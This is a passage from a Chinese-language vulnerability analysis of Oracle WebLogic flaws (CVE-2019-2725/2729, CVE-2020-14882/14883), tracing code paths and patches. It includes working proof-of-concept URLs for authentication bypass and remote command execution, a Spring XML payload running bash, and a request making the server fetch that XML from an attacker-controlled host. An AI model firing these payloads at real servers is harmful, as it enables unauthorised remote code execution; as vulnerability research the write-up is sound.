<p>在<code>ServerAddressingHandler.handleRequest()</code>中，先关注<code>setWSAVersion()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144190acff0e93c16031c5b0.png" alt="image-20210126005628769"></p>
<p>其中<code>setWSAVersion()</code>中获取请求中Message的ActionHeader，根据ActionHeader中namespaceURI的不同进行不同的处理，而我们的目的是为了跳过<code>weblogic.wsee.addressing.version</code>的赋值，原因在下</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271441fa1e92c15c1c82618a24.png" alt="image-20210126005838925"></p>
<p>在<code>validateWSAVersion()</code>函数中，如果<code>weblogic.wsee.addressing.version</code>属性若为空，则设置为<code>WSAVersion.WSA10</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144232591d48de3c89bd8fae.png" alt="image-20210126010047616"></p>
<p>回到<code>handleRequest()</code>往下看，当版本号等于<code>WSAVersion.WSA10</code>时var24为true</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442b9f7b3b216175f920672.png" alt="image-20210126010718096"></p>
<p>继续往下看，判断MsgHeader中的ActionHeader、RelatesToHeader存在则对相应属性进行赋值，同时使var23、var28为true，而var23、var28跟var24直接影响是否抛出异常，如果抛出异常<code>handlers</code>将无法继续往下遍历</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714425c3eb9528db65e68e19d.png" alt="image-20210126010423073"></p>
<p>下面来到<code>AsyncResponseHandler的handleRequest()</code>，我们需要保证Message的<code>weblogic.wsee.addressing.RelatesTo</code>属性的值为非空，否则会返回false，将导致<code>handlers</code>无法继续往下遍历</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442078b286cbbb2273d9237.png" alt="image-20210126011018421"></p>
<p>接着来到<code>OperationLookupHandler</code>的<code>handleRequest()</code>，保证Message中的<code>OperationName</code>为非空，否则会抛出异常，令<code>handlers</code>无法继续往下遍历</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714421f820f16703317a92e86.png" alt="image-20210126011223780"></p>
<p>最后来到<code>WorkAreaServerHandler</code>的<code>handleRequest()</code>，把Header的WorkAreaHeader部分传入<code>WorkContextXmlInputAdapter()</code>进行实例化，然后调用<code>receiveRequest()</code>处理，后面的就和CVE-2017-10271的漏洞分析一样了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442a84d39b0bf88d93ec0f1.png" alt="image-20210126011330536"></p>
<p><strong>补丁</strong></p>
<p>增加了对class标签的限制和array中length的大小限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">   <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="type">int</span> <span class="variable">overallarraylength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:object&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;class&quot;</span>)) &#123; <span class="comment">// new</span></span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:class&quot;</span>); </span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;new&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:new&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:method&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;void&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; attributes.getLength(); ++i) &#123;</span><br><span class="line">                     <span class="keyword">if</span> (!<span class="string">&quot;index&quot;</span>.equalsIgnoreCase(attributes.getQName(i))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid attribute for element void:&quot;</span> + attributes.getQName(i));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;array&quot;</span>)) &#123;</span><br><span class="line">                  <span class="type">String</span> <span class="variable">attClass</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span> (attClass != <span class="literal">null</span> &amp;&amp; !attClass.equalsIgnoreCase(<span class="string">&quot;byte&quot;</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The value of class attribute is not valid for array element.&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="type">String</span> <span class="variable">lengthString</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;length&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span> (lengthString != <span class="literal">null</span>) &#123;</span><br><span class="line">                     <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> Integer.valueOf(lengthString);</span><br><span class="line">                        <span class="keyword">if</span> (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123; <span class="comment">// MAXARRAYLENGTH==10000</span></span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Exceed array length limitation&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="built_in">this</span>.overallarraylength += length;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">                           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Exceed over all array limitation.&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                     &#125; <span class="keyword">catch</span> (NumberFormatException var8) &#123;</span><br></pre></td></tr></table></figure>





<h4 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a href="https://github.com/ruthlezs/CVE-2019-2729-Exploit">https://github.com/ruthlezs/CVE-2019-2729-Exploit</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://127.0.0.1:7001 -c &#x27;touch /tmp/success&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>该漏洞是对CVE-2019-2725的补丁绕过，在jdk7中解析xml时获取element元素的相关类为<code>com.sun.beans.decoder.DocumentHandler</code></p>
<p>因为在jdk7为array元素添加属性时，只能从length，class，id中选择，而唯一能创建类的class已经被加入了黑名单，所以jdk1.7版本不受此漏洞影响，这次的绕过主要针对低于1.7的jdk版本</p>
<p>而weblogic1036自带的jdk版本为1.6，jdk1.6中解析xml时有很大差异，相关处理方法在<code>com.sun.beans.ObjectHandler</code>，我们从<code>startElemen()</code>方法入手</p>
<p>在对标签进行解析时，会对其类、属性和方法进行检查，如果存在就对其进行设置，如果方法不存在，就会生成一个new方法，如果存入<code>forName</code>值的话，我们就可以引入任意类了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442f4b576f32f3d2cd492ab.png" alt="image-20210126170922028"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271443139fce816fdee93e2625.png" alt="image-20210126172345512"></p>
<p>所以绕过方法就是使用<code>&lt;array method=&quot;forName&quot;&gt;</code>来代替上面的<code>&lt;class&gt;</code>即可绕过黑名单</p>
<p><strong>补丁</strong></p>
<p>使用白名单进行修复</p>
<p>增加了一层<code>validateFormat</code>过滤，增加白名单限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WorkContextFormatInfo</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, Map&lt;String, String&gt;&gt; allowedName = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">WorkContextFormatInfo</span><span class="params">()</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		allowedName.put(<span class="string">&quot;string&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;int&quot;</span>, (Object)<span class="literal">null</span>) ;</span><br><span class="line">		allowedName.put(<span class="string">&quot;long&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		Map&lt;String, String&gt; allowedAttr = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;byte&quot;</span>);</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;length&quot;</span>, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;array&quot;</span>, allowedAttr);</span><br><span class="line">		allowedAttr = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;index&quot;</span>, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">		allowedNameput(<span class="string">&quot;void&quot;</span>, allowedAttr);</span><br><span class="line">		allowedNameput(<span class="string">&quot;byte&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;boolean&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;short&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;char&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;float&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">		allowedName.put(<span class="string">&quot;double&quot;</span>, (Object)<span class="literal">null</span>) ;</span><br><span class="line">		allowedAttr = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;java.beans.XMLDecoder&quot;</span>) ;</span><br><span class="line">		allowedAttr.put(<span class="string">&quot;version&quot;</span>, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">		allowedName.put <span class="string">&quot;java&quot;</span>, allowedattr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="*CVE-2020-14882"></a>*CVE-2020-14882</h4><blockquote>
<p>Oracle WebLogic Server  10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>我们将入口点定义到WebLogic处理Servlet请求的函数当中</p>
<p><code>com.oracle.weblogic.servlet.jar!\weblogic\servlet\internal\WebAppServletContext.class#execute</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160713802.png" alt="image-20211112160713802"></p>
<p>在判断完<code>url</code>非访问<code>/WEB-INF</code>或<code>/META-INF</code>文件时就会执行就下面的<code>securedExecute()</code>函数继续解析</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160956483.png" alt="image-20211112160956483"></p>
<p>持续根据就会来到<code>doSecuredExecute()</code>函数，这里的<code>checkAccess()</code>函数会用户进行鉴权操作</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112170050066.png" alt="image-20211112170050066"></p>
<p>如果我们想要绕过下面的认证就需令这个<code>resourceConstraint</code>变量不为空</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112170102720.png" alt="image-20211112170102720"></p>
<p><code>getConstraint()</code>函数是用来判断当前<code>url</code>是否在请求静态资源，如果是的话就会放回对应的静态资源列表，其中具体实现如下</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112171248252.png" alt="image-20211112171248252"></p>
<p>因为这里的<code>this.constraintsMap</code>字典只有一个<code>&quot;&quot;</code>的键值，所以<code>consForAllMethods</code>包含了所有了静态资源列表（列表如下），而<code>consForOneMethod</code>为空，而我们的<code>relURI</code>为<code>/css/%2e%2e%2fconsole.portal</code>，所以<code>rcForAllMethods</code>匹配到了<code>/css/</code>路径，而<code>rcForOneMethod</code>本来就是空，所以根据程序逻辑，我们返回的是不为空的<code>rcForAllMethods</code>变量，从而绕过了认证操作</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112171402107.png" alt="image-20211112171402107" style="zoom:67%;" />

<p>接下来调用<code>isAuthorized()</code>函数来判断用户是否认证</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112172240027.png" alt="image-20211112172240027"></p>
<p><code>isAuthorized()</code>函数内部又调用了<code>checkAccess()</code>来验证用户身份</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112174107658.png" alt="image-20211112174107658"></p>
<p><code>com.oracle.weblogic.servlet.jar!\weblogic\servlet\security\internal\ChainedSecurityModule.class#checkAccess</code></p>
<p>然后一直跟进到<code>checkUserPerm()</code>函数检查用户权限</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112174522850.png" alt="image-20211112174522850"></p>
<p>一直跟进到<code>hasPermission()</code>函数判断用户是否有访问权限</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112221058420.png" alt="image-20211112221058420"></p>
<p>虽然我们没有<code>AdminMode</code>，但是我们的资源列表<code>/css/*</code>是无需授权的，所以我们的<code>hasPermission()</code>返回的是<code>true</code>，一路跟下来之后<code>checkAccess()</code>函数返回的也是<code>true</code>，最终我们的<code>authorized</code>变量仍旧为<code>true</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112221257191.png" alt="image-20211112221257191"></p>
<p>之后便是跟进到WebLogic从<code>web.xml</code>中的匹配模式找到对应的<code>Servlet</code>来对请求进行处理</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112172827956.png" alt="image-20211112172827956"></p>
<p>首先我们的<code>*.portal</code>模式对应的<code>servlet-name</code>为<code>AppManagerServlet</code></p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112173625448.png" alt="image-20211112173625448" style="zoom:80%;" />

<p><code>AppManagerServlet</code>对应的<code>servlet-class</code>为<code>weblogic.servlet.AsyncInitServlet</code></p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112173711206.png" alt="image-20211112173711206" style="zoom:80%;" />

<p>根据<code>StubSecurityHelper</code>类的逻辑我们会调用到对应<code>servlet</code>的<code>service()</code>方法</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112225039009.png" alt="image-20211112225039009"></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112225010994.png" alt="image-20211112225010994"></p>
<p>在<code>service()</code>函数里，只要<code>url</code>不包含<code>;</code>字符就会调用父类的<code>service()</code>方法</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112163613908.png" alt="image-20211112163613908"></p>
<p>持续跟进到调用到<code>doGet()</code>函数，然后最终调用的是<code>doPost()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112164009192.png" alt="image-20211112164009192"></p>
<p>这里会调用<code>createUIContext()</code>函数来获取对应的<code>jspContext</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112225315294.png" alt="image-20211112225315294"></p>
<p>调用<code>getTree()</code>返回控件树</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112225810102.png" alt="image-20211112225810102"></p>
<p>但是在调用<code>getTree()</code>函数时又对<code>pattern</code>进行了一次url解码，这里就是目录穿越的核心</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112230235971.png" alt="image-20211112230235971"></p>
<p><code>processStream()</code>函数内部使用<code>getMergedControlFromFile()</code>函数从<code>file</code>（即上面<code>pattern</code>）文件中来获取对应的UI控件</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112231103897.png" alt="image-20211112231103897"></p>
<p>调用<code>getControlFactoryFromFile()</code>函数来读取xml文件<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116182041346.png" alt="image-20211116182041346"></p>
<p>最后通过<code>getControlFactoryFromFileWithoutCaching()</code>获取文件内容，即本次目录穿越漏洞的<strong>Sink</strong></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116182239347.png" alt="image-20211116182239347"></p>
<p><strong>patch</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] IllegalUrl = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;;&quot;</span>, <span class="string">&quot;%252E%252E&quot;</span>, <span class="string">&quot;%2E%2E&quot;</span>, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;%3C&quot;</span>, <span class="string">&quot;%3E&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>对路径进行校验，但是可以用小写url绕过</p>
<h4 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h4><p><strong>poc</strong></p>
<ol>
<li><code>ShellSession</code>命令执行（Weblogic 10.3.6无此类）</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><code>FileSystemXmlApplicationContext</code>命令执行</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/success2]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://172.28.164.182:9000/evil.xml&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>继续回到<code>createUIContext()</code>，我们跟进一下<code>setServletRequest()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116183939028.png" alt="image-20211116183939028"></p>
<p>当传入的<code>_nfpb</code>参数为<code>true</code>时，就会把<code>isPostback</code>设置为<code>true</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116184255406.png" alt="image-20211116184255406"></p>
<p>在创建完控件上下文之后调用<code>runLifecycle()</code>函数进入控件的生命周期</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112230430470.png" alt="image-20211112230430470" style="zoom:80%;" />

<p>当<code>isOutBound</code>为<code>false</code>（默认）和<code>isPostback</code>为<code>true</code>时，就会调用<code>runInbound()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116184719698.png" alt="image-20211116184719698"></p>
<p>在<code>runInbound()</code>函数中会把<code>_inboundLifecycle</code>赋给<code>VisitorType</code>，每个<code>VisitorType</code>对应着该生命周期中的一个控件操作，其中<code>_inboundLifecycle</code>的第一个控件操作为<code>UIControl.init</code></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116185044545.png" alt="image-20211116185044545"></p>
<blockquote>
<p>题外，其实这里的<code>_nfpb=true</code>并不是必须的，因为我们的核心是调用到<code>UIControl.init</code>控件操作，而<code>_outboundLifecycle</code>实际也有这个操作</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116192941383.png" alt="image-20211116192941383" style="zoom:80%;" />
</blockquote>
<p>调用<code>walk()</code>来遍历<code>console.portal</code>文件中的控件节点并对其执行<code>VisitorType</code>中对应的操作</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116185335651.png" alt="image-20211116185335651"></p>
<p>跟进<code>walkRecursive()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160156084.png" alt="image-20211112160156084"></p>
<p>当遍历指针<code>visit</code>识别到有节点时就会调用<code>visit()</code>函数执行对应的控件操作</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116190638412.png" alt="image-20211116190638412"></p>
<p>而这里就是对控件进行初始化</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116191217581.png" alt="image-20211116191217581"></p>
<p>如果该节点具有子节点就继续调用<code>walkRecursive()</code>函数对子节点进行遍历</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116185825460.png" alt="image-20211116185825460"></p>
<p>遍历方向如下图所示</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116191101845.png" alt="image-20211116191101845"></p>
<p>在识别到<code>/PortalConfig/contentheader/ContentHeader_breadcrumbs.portlet</code>节点时，程序会调用<code>Portlet</code>类父类的初始化函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113011922491.png" alt="image-20211113011922491"></p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113011937480.png" alt="image-20211113011937480"></p>
<p>其中<code>Portlet</code>类的继承链和<code>init()</code>操作如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Portlet</span> <span class="keyword">extends</span> <span class="title class_">class</span> Window</span><br><span class="line">	<span class="built_in">super</span>.init()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Window</span> <span class="keyword">extends</span> <span class="title class_">class</span> EntitledUIControl</span><br><span class="line">	<span class="built_in">super</span>.init()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EntitledUIControl</span> <span class="keyword">extends</span> <span class="title class_">class</span> AdministeredBackableControl</span><br><span class="line">	<span class="title function_">init</span><span class="params">()</span> &lt;== not exists</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdministeredBackableControl</span></span><br><span class="line">	init()</span><br></pre></td></tr></table></figure>

<p>所以它最终会调用到<code>AdministeredBackableControl</code>的<code>init()</code>函数进行初始化</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160001615.png" alt="image-20211112160001615" style="zoom:80%;" />

<p><code>netuix_servlet.jar!\com\bea\netuix\servlets\controls\Backable.class#initializeBackingFile</code></p>
<p>继续跟进它的<code>init()</code>函数</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112155932230.png" alt="image-20211112155932230"></p>
<p>这里是获取了我们传入的<code>handle</code>参数</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112155806888.png" alt="image-20211112155806888" style="zoom:80%;" />

<p>然后程序就可以初始化任意<code>handle</code>类</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113002831750.png" alt="image-20211113002831750"></p>
<p>其中<code>ShellSession</code>类的调用栈如下</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113002623429.png" alt="image-20211113002623429" style="zoom:80%;" />

<p>其中<code>FileSystemXmlApplicationContext</code>类的调用栈如下</p>
<p>下载xml文件</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113015257300.png" alt="image-20211113015257300" style="zoom:80%;" />

<p>解析xml文件</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113015841997.png" alt="image-20211113015841997" style="zoom:80%;" />

<p><strong>patch</strong></p>
<ol>
<li><p>官方对CVE-2020-14883的补丁是在com\bea\console\handles\HandleFactory#getHandle的方法中对传入的类的类型进行检查，是否为handle的子类。这里通过handle实现类<code>com.bea.console.handles.HandleImpl</code>的子类<code>com.bea.console.handles.JndiBindingHandle</code>的接收String的构造方法将jndi的url作为payload传入；单独这一点并不能实现RCE（之前虽然知道补丁的修复方式但是觉得单独这个无法RCE就没细看，谁知道可以结合其他点来实现RCE）。 </p>
</li>
<li><p>在com.bea.console.actions.jndi.JNDIBindingAction#execute方法中，构造了JndiBindingHandle对象，并通过获取jndi的payload，并进行了特定的拼接（这里根据其拼接方式进行特殊构造），调用javax.naming.Context#lookup实现了jndi注入导致的RCE。</p>
</li>
</ol>
<h2 id="回显构造"><a href="#回显构造" class="headerlink" title="回显构造"></a>回显构造</h2><p>具体参考一下@Y4er师傅的<a href="https://y4er.com/post/java-deserialization-echo/">文章</a></p>
<ol>
<li>defineClass</li>
<li>RMI绑定实例</li>
